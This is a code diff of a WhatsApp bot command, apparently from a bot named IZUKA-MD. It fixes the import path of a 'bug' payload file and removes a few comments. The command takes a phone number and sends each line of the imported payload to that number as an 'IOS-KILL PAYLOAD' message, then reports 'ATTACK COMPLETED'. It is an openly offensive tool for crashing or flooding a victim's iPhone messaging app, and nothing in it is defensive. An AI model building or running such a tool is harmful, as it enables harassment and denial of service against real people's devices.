@@ -1,4 +1,4 @@
-const bugchat = require('../../bug/izuka3.js');
+const bugchat = require('../bug/izuka3.js'); // ✅ CORRECTED PATH
 const config = require('../../config');
 const { cmd } = require('../command');
 
@@ -54,12 +54,10 @@ cmd({
   const targetJid = `${targetNumber}@s.whatsapp.net`;
   const attackLines = bugchat.split('\n').filter(Boolean);
 
-  // Debut mesaj
   await Matrix.sendMessage(m.from, {
     text: `🧠 *IZUKA-MD IOS-KILL DEPLOYED*\n\n👾 Targeting: *+${targetNumber}*\n📱 Device: *iPhone*\n🔋 Intensity: *MAXIMUM*\n\n⏳ *Launching Payload...*`,
   }, { quoted: m });
 
-  // Envoi chak payload
   for (let i = 0; i < attackLines.length; i++) {
     await Matrix.sendMessage(targetJid, {
       text: `🧨 *IOS-KILL PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _IZUKA-MD ATTACK ENGINE_`,
@@ -67,7 +65,6 @@ cmd({
     await new Promise(r => setTimeout(r, 250));
   }
 
-  // Fini mesaj
   await Matrix.sendMessage(m.from, {
     text: `✅ *ATTACK COMPLETED*\n\n💥 *IOS-KILL successfully delivered to* +${targetNumber}\n🔚 *Operation Finished.*`,
   }, { quoted: m });
